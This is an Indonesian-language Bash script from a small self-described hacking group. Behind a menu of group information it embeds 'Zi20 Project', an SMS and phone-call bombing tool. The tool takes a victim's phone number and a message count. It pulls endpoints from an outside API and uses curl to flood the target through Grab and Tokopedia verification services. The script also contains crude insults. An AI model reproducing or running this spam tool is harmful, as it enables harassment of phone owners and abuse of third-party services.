#!/system/xbin/bash
#INDONESIA CYBER
#This DICK Mwehehe 
#            ____   _____
#          / [ • ]  | |  [ • ] \
#         |  \     ___      /  |
#         |    \_______/    |
#         |                        |
#        /                        \
#       \_______/\_____/
clear
echo "\033[31;1m [★]================================================[★]"
echo "\033[32;1m [-] Kang ReCode    : Dr.Zi20                       [-]"
echo "\033[36;1m [★]Team     : Nub 5ec Cyber                      [★]"
echo "\033[32;1m [-]Version  : 0.0                                  [-]"
echo "\033[31;1m [★]================================================[★]"
sleep 2
echo "\033[36;1m WAIT.."
sleep 1
echo "\033[36;1m WAIT...."
sleep 1
echo "MENGAMBIL IP......"
sleep 2
echo "\033[32;1m Done......."
sleep 1
echo "\033[36;1m
1. info Nub 5ec Cyber
2. tanggal dibuatnya Nub 5ec Cyber
3. anggota Nub 5ec Cyber
4. Zi20 Project"
echo "\033[31;1m 5. Out?"
 sleep 1
 echo "\033[33;1m Pilih Nomor"
 read -p "[?] Pilih Nying > " p
 
 if [ $p = 5 ]
 then
 clear
 toilet -f mono12 -F gay "BYE"
 sleep 3
 echo "Ayy and Zi20 Mengucapkan"
 sleep 2
 echo "\033[35;1m Terima Kasih"
 sleep 0.30
 echo "See u later"
 exit
 fi

  if [ $p = 1 ]
 then
 clear
 echo "\033[32;1m
 Anggota Nub 5ec Cyber Beranggota Hanya2 Orang NoLife Mereka Hate People(membenci orang/keramaian)
 Kalau Ingin Tau Siapa 2 Orang tersebut Langsung Ke Scriptnya "
 sleep 3
 echo "WAIT..."
sleep 5
 sh infoN5C.sh
 fi

 if [ $p = 2 ]
 then
 clear
 echo "Menampilkan..."
 sleep 5
 echo "\033[32;1m 
 Nub5ecCyber dibuat tanggal 08 bulan 11 tahun 2018"
 sleep 10
 sh infoN5C.sh
 fi
 
 if [ $p = 3 ]
 then
 clear
 echo "Menampilkan..."
 sleep 5
 echo "\033[32;1m Nub5ecCyber hanyalah 2 orang yaitu:"
 echo "\033[33;1m
 1. Zi20
 2.Ayy"
 sleep 10
 sh infoN5C.sh
 fi
 
 if [ $p = 4 ]
 then
 clear
 troll(){
    clear
    echo " ============================="
    sleep 2
    echo " ==      Zizo Project      =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Gunakan Zi20 Project Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah menggunakan Zi20 project"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Close Zi20 Project"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Troll Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081222203820
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo " Love u always "
                    echo " Nub5ecCo "
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo " Love u always "
                  echo " Nub5ecCo "
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Troll project"
        sh infoN5C.sh
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai zizo project?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
sh infoN5C.sh
fi
 
 if [ $p = 6 ]
 then
echo "\033[31;1m KESALAHAN!!!"
sleep 3
echo "akan dikembalikan keMainMenu"
sleep 1
echo "dalam"
sleep 1
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
sh infoN5C.sh
fi

if [ $p = 7 ]
then 
echo "HEHE"
sleep 2
echo "\033[31;1m KNTL PILIH YANG ADA DITOOLSNYA"
sleep 1 
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
sh infoN5C.sh
fi
